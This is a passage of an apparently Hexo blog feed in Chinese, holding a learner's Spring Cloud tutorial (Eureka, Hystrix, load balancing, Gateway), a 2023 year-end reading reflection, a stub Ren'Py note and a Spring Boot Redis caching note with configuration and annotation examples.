这是一个常见的配置文件格式，用于存储配置数据。它使用缩进和冒号来区分键和值。</li><li><strong>Spring Boot</strong>: 是一个用于创建独立、生产级的基于Spring的应用程序的框架。它简化了Spring应用程序的初始化和开发过程。</li><li><strong>Eureka</strong>: 是Netflix开发的服务发现组件，用于定位运行在AWS云或其他云平台上的中间层服务，从而实现中间层服务的故障转移和负载均衡。</li></ul><p>总的来说，这个配置文件是用来设置一个Eureka服务注册中心的服务器，它将在本地的8081端口上运行，并使用默认的服务URL进行服务注册。</p><h2 id="试运行"><a href="#试运行" class="headerlink" title="试运行"></a>试运行</h2><p>配置完成后再java里的SpringEurekaApplication里启动项目来访问服务</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line">#SpringEurekaApplication.java</span><br><span class="line"><span class="keyword">package</span> com.example.springeureka;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.cloud.netflix.eureka.server.EnableEurekaServer;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableEurekaServer</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpringEurekaApplication</span> {</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> {</span><br><span class="line">        SpringApplication.run(SpringEurekaApplication.class, args);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这里需要添加**@EnableEurekaServer**后才能正常访问</p><h2 id="配置子模块consumer"><a href="#配置子模块consumer" class="headerlink" title="配置子模块consumer"></a>配置子模块consumer</h2><p>创建子模块consumer和配置上一个子模块过程一样，修改parent 修改对应版本JDK，增加相关依赖</p><p><strong>注意</strong>：如果出现报错问题，请随时检查你的maven配置问题，绝大多数代码正确报错都是因为Maven下载依赖失败</p><h2 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h2><figure class="highlight yml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8082</span></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://localhost:8081/eureka</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">spring-consumer</span></span><br></pre></td></tr></tbody></table></figure><p>和之前不一样的是，这次的端口号要发生改变，同样将这个模块注册到注册中心eureka,然后给新模块设置一个名字</p><p>完成后启动注册中心模块，再启动consumer模块，可以看到新DS Replicas的出现，由于我们注册中心本身也会被注册，如果不想它被注册，可以增加两行代码也设置</p><figure class="highlight yaml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="string">注册中心配置文件</span> <span class="string">eureka</span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">8081</span></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">    <span class="attr">client:</span></span><br><span class="line">        <span class="attr">service-url:</span></span><br><span class="line">            <span class="attr">defaultZone:</span> <span class="string">http://localhost:8081/eureka</span></span><br><span class="line">        <span class="attr">fetch-registry:</span> <span class="literal">false</span></span><br><span class="line">        <span class="attr">register-with-eureka:</span> <span class="literal">false</span></span><br></pre></td></tr></tbody></table></figure><h2 id="配值子模块provider"><a href="#配值子模块provider" class="headerlink" title="配值子模块provider"></a>配值子模块provider</h2><h3 id="模块启动失败问题解决办法"><a href="#模块启动失败问题解决办法" class="headerlink" title="模块启动失败问题解决办法"></a>模块启动失败问题解决办法</h3><p>如果遇到模块启动失败，依赖添加后还是无法正常启动，请打开项目管理-模块-找到启动失败的模块-修改模块SDK</p><p>即可解决依赖版本JDK冲突</p><p><img src="/Blackcat-loveBlog/png/springcloud2.png"></p><h2 id="熔断器hystrix"><a href="#熔断器hystrix" class="headerlink" title="熔断器hystrix"></a>熔断器hystrix</h2><p>使用熔断器可以在报错时截取并且输出规定好的内容方便让服务者知道问题错误出在哪里</p><p>依赖（高版本会自带无需添加）:</p><figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--        容错器hystrix--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-netflix-hystrix<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>配置:</p><figure class="highlight yaml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">feign:</span></span><br><span class="line">  <span class="attr">hystrix:</span></span><br><span class="line">    <span class="attr">enabled:</span> <span class="literal">true</span></span><br></pre></td></tr></tbody></table></figure><p>创建的熔断器类:</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.springconsumer;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserFeignHystrix</span> <span class="keyword">implements</span> <span class="title class_">UserService</span> {</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">login</span><span class="params">(String username, String password)</span> {</span><br><span class="line">        log.info(<span class="string">"服务器抛锚"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>Service类需要修改链接熔断器</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.springconsumer;</span><br><span class="line"><span class="keyword">import</span> org.springframework.cloud.openfeign.FeignClient;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"></span><br><span class="line"><span class="meta">@FeignClient(value = "spring-provider",fallback = UserFeignHystrix.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserService</span> {</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping("/login")</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">login</span><span class="params">(<span class="meta">@RequestParam("username")</span> String username,<span class="meta">@RequestParam("password")</span>String password)</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>主要在于这一句</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">@FeignClient(value = "spring-provider",fallback = UserFeignHystrix.class)</span></span><br></pre></td></tr></tbody></table></figure><p>链接的刚刚创建的类，如果方法出现问题，就会打印<strong>log</strong></p><p>这样当你访问此类的时候就会被熔断</p><h3 id="负载均衡器分担方式"><a href="#负载均衡器分担方式" class="headerlink" title="负载均衡器分担方式"></a>负载均衡器分担方式</h3><p>通过设置集群分担方式可以减轻负载，给多个集群平衡分担请求</p><p>通过一些设置可以实现不同的分担方式，默认是轮播分担</p><p>在启动类添加此方法修改分担方式</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line">   <span class="keyword">public</span> RestTemplate <span class="title function_">restTemplate</span><span class="params">()</span>{</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">RestTemplate</span>();</span><br><span class="line">   }</span><br><span class="line"></span><br><span class="line">   <span class="meta">@Bean</span></span><br><span class="line">   <span class="keyword">public</span> IRule <span class="title function_">randomRule</span><span class="params">()</span>{</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">RandomRule</span>();</span><br><span class="line">   }</span><br></pre></td></tr></tbody></table></figure><p>完整类</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.springconsumer;</span><br><span class="line"><span class="keyword">import</span> com.netflix.loadbalancer.IRule;</span><br><span class="line"><span class="keyword">import</span> com.netflix.loadbalancer.RandomRule;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.cloud.openfeign.EnableFeignClients;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.client.RestTemplate;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableFeignClients</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpringConsumerApplication</span> {</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> RestTemplate <span class="title function_">restTemplate</span><span class="params">()</span>{</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">RestTemplate</span>();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> IRule <span class="title function_">randomRule</span><span class="params">()</span>{</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">RandomRule</span>();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> {</span><br><span class="line">        SpringApplication.run(SpringConsumerApplication.class, args);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>官方介绍:</p><p>要通过设置集群分担方式来减轻负载，可以使用负载均衡器来实现。负载均衡器是一种能够平衡多个服务器或集群之间负载的设备，它可以根据指定的策略将请求分发到不同的服务器，以确保各个服务器或集群负载均衡。负载均衡器可以通过多种算法进行请求分担，例如轮询、最少连接、IP哈希等。</p><p>对于新手来说，可以通过以下步骤来理解和使用负载均衡器：</p><ol><li>了解负载均衡器的基本原理：新手可以先了解负载均衡器的工作原理，包括其作用、不同的负载均衡算法以及常见的应用场景。</li><li>选择适合的负载均衡器：根据自己的需求和环境选择合适的负载均衡器，比如Nginx、HAProxy等，并学习其基本配置和使用方法。</li><li>配置和部署负载均衡器：按照文档或教程的指导，配置和部署选定的负载均衡器，包括定义后端服务器、设置负载均衡策略等。</li><li>测试和监控：在配置完成后，进行测试以确保负载均衡器能够正常工作，并设置监控系统来实时监测负载均衡器的性能和状态。</li></ol><p>通过以上步骤，新手可以逐步理解和应用负载均衡器来实现集群分担方式，从而减轻服务器负载并提高系统的可靠性和性能。</p><h2 id="子模块gateway网关"><a href="#子模块gateway网关" class="headerlink" title="子模块gateway网关"></a>子模块gateway网关</h2><p>创建子模块，注意下一步后不要勾选任何依赖尤其是SpringWeb。</p><p>添加依赖:</p><figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-gateway<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-netflix-eureka-client<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>配置文件yml:</p><figure class="highlight yaml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8080</span></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://localhost:8081/eureka</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">spring-gateway</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">gateway:</span></span><br><span class="line">      <span class="attr">routes:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">cloud-user-consumer</span>    <span class="comment">#随便起名字</span></span><br><span class="line">          <span class="attr">uri:</span> <span class="string">spring-consumer</span> <span class="comment">#服务名称</span></span><br><span class="line">          <span class="attr">predicates:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">Path=/consumer/**</span>         <span class="comment">#访问路径</span></span><br><span class="line"><span class="comment">#         filters:</span></span><br><span class="line"><span class="comment">#           - StripPrefix=1            #过滤前缀</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>过滤前缀后就无法通过consumer访问其下的方法</p><p>首先配置一个未被使用的端口号</p><p>使用eureka注册</p><p>使用spring-name设置名称</p><p>使用cloud设置路由</p><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><p>使用网关的路由转发后，可以通过设置好的路径直接访问到对应端口的方法</p><p>转发前:</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">localhost:8082/toLogin?username=admin&amp;password=admin</span><br></pre></td></tr></tbody></table></figure><p>转发后:</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://localhost:8080/consumer/toLogin?username=admin&amp;password=admin</span><br></pre></td></tr></tbody></table></figure><p>因为设置了路由，所以无需再修改端口号，只需要访问网关的端口然后网关再自动访问其他端口就可以</p>]]></content>
      
      
      
        <tags>
            
            <tag> 框架 </tag>
            
            <tag> Spring </tag>
            
            <tag> 微服务 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023年终总结</title>
      <link href="/NANABLOG/2023/12/31/2023%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
      <url>/NANABLOG/2023/12/31/2023%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>再有几个小时就是2024年了，刚看完其他UP主做的年终总结，有了自己也要写一个的想法，便有了这篇文章。</p><p>对我而言，我很在乎自己对于时间投入的产出比，在这个年纪，这是我们唯一的资产，所以最终总结为，这一年收获了什么，有什么遗憾，和下一年的目标。</p><p>关于收获，这一年学会了更多有关编程的知识，对网络了解也提高了不少。</p><p>看书方面，由于还是不够自律，看的零零散散，今年看完了瑞达利欧写的《原则》，让我明白，在做人做事上，原则的重要性会影响我们的一生，我们应该为自己设立三个原则，生活原则，工作原则，自身原则，并且不断改善原则，让原则顺其自然帮助你成长，一个好的习惯可以受益终生就是这个说法。</p><p>另外在2022年看完了《小狗钱钱》后，就想去看后续的故事，所以今年看了《富爸爸和穷爸爸》,这是一个系列的书籍，一共有五本，目前只看了一本，教你如何理财，正确看待金钱，非常有价值的一本书，虽然发行的时间距离今天已经有很久，但里面的一些预测放在现在依然精准，教的一些理财方法也很有用，比如我们每个人都应该有一个自己的资产负债表，明确的列出我们所拥有的资产和负债，现金流，帮助我们看清自身经济的真实走向。</p><p>剩下的书籍都是在手机上下载的电子书，阅读起来虽然没有实体书舒服，但不用花钱，就已经知足了。</p><p>唯一看完的一本是《不上班也有钱》，这是第一次有一种被文字拉进去的感觉，看的时候几乎目不暇接，让人有不断翻下去的欲望，以往都是你需要思考，然后停留一会才继续看，但这本书却让我阅读的非常流畅，中间也有一些停顿的点，但一点也不晦涩。它讲述的内容和我目前正在迷茫的点也很吻合，在我目前看来，这几乎是最简单的理财方法了，并且可行，但我认为大部分人都难以做到。</p><p>剩下的书籍过于难啃，都是一些技术类，很多看了一半后不想再看，亦或者看一点都花了大量的时间思考和吸收然后就搁置了。</p><p>比如有一本书叫做《朋友圈的尖子生》，前面的内容非常有趣，但看了一半后后面突然变得乏味无比，可能是和自身境界突然有了很大偏差，环境不同，没有想看下去的欲望了。</p><p>亦或者还有一本叫做《煤老板自述三十年》上面记录到看了60%多后，后面的也不想看了，原因在于我认为有一些和前面的内容高度重合，虽然故事本身不一样，但逻辑剧情起伏没有多大变化，这不怪书，而是世界运行逻辑就是如此，一个成功人，必然经历起伏的人生，但依然推荐这本书，因为真的挺好看的，之前和我爸聊天的时候我也总是会讲一些书中的内容，这就是那个年代很有代表性的一群人。</p><p>有时候想要对自己看的书做一些笔记，方便之后再次阅读有新的感悟，所以我找到了一本书叫做《边写边思考的大脑整理笔记法》，其实它说的还挺对的，但看完后现在已经忘的差不多了。</p><p>有时候在视频上刷到了罗翔老师讲刑法，想到了老师自己也有写一本书，所以就下载下来看了一点，叫做《圆圈正义》，不得不说，让我很受益，如果有时间我会继续看完的。剩下的书过于零散就不讲了。</p><p>最后要将的一本书就是《马克思资本论》这是一本对我来说很重要的书，里面的知识过于干，对我而言很难吸收，但就算如此我也依然有决心想要看完这本书，这应该是我头一次思考很久的书，基本上每读一章就要思考很久，所以新的一年继续坚持读。</p><p>因为学校电脑卡顿，购置了新的笔记本，很开心。</p><p>计划写一本书，目前只完成了20%有六万字左右，希望有一天写完后能打印出来。</p><p>遗憾方面，自己浪费了很多时间，不够自律，人机关系处理的也不够好，明明有很多计划，但是每当施行的时候总是因为懒惰半途而废。</p><p>新的一年的目标，嗯….</p><p>首先这一年我希望不要让计划停留在构思阶段，而是有所进展，并且每个月都罗列出计划表，鼓励和鞭策自己完成计划，或者出现纰漏后修改再继续执行。</p><p>对之前所学的内容进行复习，可以有所新的领悟。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 年终总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>renpy学习笔记</title>
      <link href="/NANABLOG/2023/12/28/renpy%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/NANABLOG/2023/12/28/renpy%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p><img src="/Blackcat-loveBlog/png/jNmXrp.png"></p><p>基本命令</p>]]></content>
      
      
      
        <tags>
            
            <tag> GalGame </tag>
            
            <tag> Ren&#39;py </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SpringBoot_Redis整合学习笔记</title>
      <link href="/NANABLOG/2023/12/26/SpringBoot-Redis%E6%95%B4%E5%90%88%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/NANABLOG/2023/12/26/SpringBoot-Redis%E6%95%B4%E5%90%88%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="配置Redis"><a href="#配置Redis" class="headerlink" title="配置Redis"></a>配置Redis</h1><p>在SpringBoot项目中配置Redis</p><p><img src="/Blackcat-loveBlog/png/springBoot_Redis.png"></p><h2 id="添加依赖"><a href="#添加依赖" class="headerlink" title="添加依赖"></a>添加依赖</h2><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">     &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">     &lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt;</span><br><span class="line">     &lt;version&gt;3.0.4&lt;/version&gt;</span><br><span class="line"> &lt;/dependency&gt;</span><br><span class="line">  &lt;!-- spring2.X集成redis所需common-pool2 如果上面引入的依赖是2.x则加--&gt;</span><br><span class="line">  &lt;dependency&gt;</span><br><span class="line">      &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">      &lt;artifactId&gt;commons-pool2&lt;/artifactId&gt;</span><br><span class="line">      &lt;version&gt;2.6.0&lt;/version&gt;</span><br><span class="line">  &lt;/dependency&gt;</span><br></pre></td></tr></tbody></table></figure><h2 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h2><figure class="highlight yaml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">driver-class-name:</span> <span class="string">com.mysql.cj.jdbc.Driver</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql://127.0.0.1:3306/hospot?useUnicode=true&amp;characterEncoding=utf8&amp;useSSL=false&amp;serverTimezone=UTC&amp;zeroDateTimeBehavior=convertToNull</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">password:</span> <span class="number">123456</span></span><br><span class="line">  <span class="attr">redis:</span></span><br><span class="line">    <span class="attr">host:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">6379</span></span><br><span class="line">    <span class="attr">database:</span> <span class="number">1</span></span><br><span class="line">    <span class="attr">timeout:</span> <span class="number">1800000</span></span><br><span class="line"><span class="comment">#    password: 123456</span></span><br><span class="line">    <span class="attr">lettuce:</span></span><br><span class="line">      <span class="attr">pool:</span></span><br><span class="line">        <span class="attr">max-active:</span> <span class="number">50</span></span><br><span class="line">        <span class="attr">max-wait:</span> <span class="number">100</span></span><br><span class="line">        <span class="attr">max-idle:</span> <span class="number">25</span></span><br><span class="line">        <span class="attr">min-idle:</span> <span class="number">20</span></span><br><span class="line">  <span class="comment">#    启动事务管理</span></span><br><span class="line">  <span class="attr">jpa:</span></span><br><span class="line">    <span class="attr">generate-ddl:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">show-sql:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">properties:</span></span><br><span class="line">      <span class="attr">hibernate:</span></span><br><span class="line">        <span class="attr">format_sql:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">transaction:</span></span><br><span class="line">    <span class="attr">default-timeout:</span> <span class="number">60</span></span><br><span class="line">    <span class="attr">rollback-on-commit-failure:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">mybatis-plus:</span></span><br><span class="line">  <span class="attr">configuration:</span></span><br><span class="line">    <span class="attr">map-underscore-to-camel-case:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">log-impl:</span> <span class="string">org.apache.ibatis.logging.stdout.StdOutImpl</span></span><br><span class="line">  <span class="comment">#mapper配置文件的位置</span></span><br><span class="line">  <span class="attr">mapper-locations:</span> <span class="string">classpath:mapper/xml/*.xml</span></span><br><span class="line">  <span class="comment">#别名</span></span><br><span class="line">  <span class="attr">type-aliases-package:</span> <span class="string">com.bdqn.student.entity</span></span><br><span class="line">  <span class="comment"># 启用事务管理</span></span><br><span class="line">  <span class="attr">transaction:</span></span><br><span class="line">    <span class="attr">factory:</span> <span class="string">managed</span></span><br></pre></td></tr></tbody></table></figure><p>其中是在原有配置文件基础上增加了</p><figure class="highlight yaml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">    <span class="attr">redis:</span></span><br><span class="line">        <span class="attr">host:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">        <span class="attr">port:</span> <span class="number">6379</span></span><br><span class="line">        <span class="attr">database:</span> <span class="number">1</span></span><br><span class="line">        <span class="attr">timeout:</span> <span class="number">1800000</span></span><br><span class="line">        <span class="attr">password:</span> <span class="number">123456</span></span><br><span class="line">        <span class="attr">lettuce:</span></span><br><span class="line">          <span class="attr">pool:</span></span><br><span class="line">            <span class="attr">max-active:</span> <span class="number">20</span></span><br><span class="line">            <span class="attr">max-wait:</span> <span class="number">-1</span></span><br><span class="line">            <span class="attr">max-idle:</span> <span class="number">5</span></span><br><span class="line">        <span class="attr">min-idle:</span> <span class="number">0</span></span><br></pre></td></tr></tbody></table></figure><h2 id="在Config里添加RedisConfig-java"><a href="#在Config里添加RedisConfig-java" class="headerlink" title="在Config里添加RedisConfig.java"></a>在Config里添加RedisConfig.java</h2><p>用来在SpringBoot项目中使用Redis,项目启动后自动配置文件</p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>在java测试类测试是否配置成功</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.springbootvue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.junit.jupiter.api.Test;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.test.context.SpringBootTest;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.core.RedisTemplate;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.annotation.Resource;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootTest</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TextRedis</span> {</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> RedisTemplate redisTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">tRedis</span><span class="params">()</span>{</span><br><span class="line">     redisTemplate.opsForValue().set(<span class="string">"test"</span>,<span class="string">"test"</span>);</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><h2 id="使用-Cacheable"><a href="#使用-Cacheable" class="headerlink" title="使用@Cacheable"></a>使用@Cacheable</h2><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">@Cacheable(value = "userCache",key="#page.current+'_'+#page.size")</span></span><br><span class="line">   <span class="meta">@PostMapping("list")</span></span><br><span class="line">   <span class="keyword">public</span> Page&lt;Charts&gt; <span class="title function_">findlist</span><span class="params">(<span class="meta">@RequestBody</span> Page&lt;Charts&gt; page)</span> {</span><br><span class="line">       System.out.println(<span class="string">"分页控制器就收参数:"</span> + page);</span><br><span class="line">       Page&lt;Charts&gt; p = chartsService.page(page);</span><br><span class="line">       System.out.println(p);</span><br><span class="line">       <span class="keyword">return</span> p;</span><br><span class="line">   }</span><br></pre></td></tr></tbody></table></figure><p>通过使用@Cacheable注解</p><p>会将返回的值缓存到Redis数据库中</p><p>然后下次调用会在Redis中拿数据</p><p>其中Value是数据名 key是键值唯一 内容则是返回数</p><p>除了key值和value值，还有一个参数是<strong>unless</strong></p><p>用来判断返回值是否为<strong>null</strong>，当返回结果没有则不缓存，这是为了实现防空判断，不然存储一个空值是没有意义的</p><p>示例:</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">@Cacheable(value="userCache",key = "#id",unless = "#result == null")</span></span><br></pre></td></tr></tbody></table></figure><p>tip:查询时使用@Cacheable</p><h2 id="使用-CacheEvict"><a href="#使用-CacheEvict" class="headerlink" title="使用@CacheEvict"></a>使用@CacheEvict</h2><p>示例:</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">@CacheEvict(value = "userCache",key = "#tSysUser.id",allEntries = true)</span></span><br></pre></td></tr></tbody></table></figure><p>其中和上一个例子不同的是多了一个参数<strong>allEntries</strong></p><p>它的作用是缓存时<strong>删掉</strong>之前的数据在<strong>增加</strong>新的数据</p><p>当你<strong>添加</strong>数据的时候，缓存也应该随之发生<strong>变化</strong></p><p>tip:<strong>添加</strong>时使用@CacheEvict</p><h2 id="使用-CachePut"><a href="#使用-CachePut" class="headerlink" title="使用@CachePut"></a>使用@CachePut</h2><p>使用@CachePut用来缓存更新数据</p><p>示例:</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">@CachePut(value = "userCache",key = "#id",allEntries = true，unless = "#result == null")</span></span><br></pre></td></tr></tbody></table></figure><p>与增加不同的是，更新的注释不会删除之前的数据，而是在此基础上更新数据</p>]]></content>
      
      
      
        <tags>
            
            <tag> Spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>液金偏移检测软件</title>
      <link href="/NANABLOG/2023/12/22/%E6%B6%B2%E9%87%91%E5%81%8F%E7%A7%BB%E6%A3%80%E6%B5%8B%E8%BD%AF%E4%BB%B6/"/>
      <url>/NANABLOG/2023/12/22/%E6%B6%B2%E9%87%91%E5%81%8F%E7%A7%BB%E6%A3%80%E6%B5%8B%E8%BD%AF%E4%BB%B6/</url>
      
